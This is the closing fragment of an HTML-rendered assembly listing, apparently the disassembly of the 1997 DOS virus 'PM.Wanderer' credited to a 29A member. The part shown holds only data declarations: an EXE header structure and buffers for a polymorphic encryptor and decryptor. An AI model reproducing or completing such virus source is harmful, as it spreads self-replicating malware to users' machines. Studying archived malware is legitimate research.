</span><span class="sc5">max_mem</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">stack_seg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">stack_ofs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">checksum</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">val_ip</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">val_cs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ofs_reloc</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">overlays</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">wanderer</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">data0</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">STACK_SIZE</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; Stack</span><span class="sc0">
</span><span class="sc5">_esp</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; Buffer for encryptor</span><span class="sc0">
</span><span class="sc5">end_encryptor</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; Buffer for encryptor</span><span class="sc0">
</span><span class="sc5">psp_seg</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filedate</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">previous_ofs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mask_dec_ofs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mask_enc_ofs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ofs_loop_begin</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">decryptor_size</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">max_garbage</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ptr_select_reg</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">code_size</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">operations</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">indexreg_op1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">delta_ofs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">enc_buffer</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">unused_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">saved_sp</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">saved_ss</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">
</span><span class="sc5">copy_code</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">data0</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">    </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">; End of PM.Wanderer disassembly</span><span class="sc0">
</span><span class="sc1">; (c) 1997, Tcp/29A (tcp@cryogen.com)</span><span class="sc0">
</span></div></body>
</html>
